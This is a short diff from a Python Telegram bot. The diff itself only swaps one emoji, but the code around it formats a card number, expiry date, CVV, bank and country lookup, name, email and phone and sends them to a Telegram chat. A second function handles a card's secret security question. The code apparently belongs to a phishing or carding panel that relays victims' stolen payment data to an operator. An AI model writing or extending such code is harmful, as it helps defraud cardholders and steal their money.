@@ -24,7 +24,7 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🏳️‍🌈: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}')
+    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}')
     bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
     
 def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
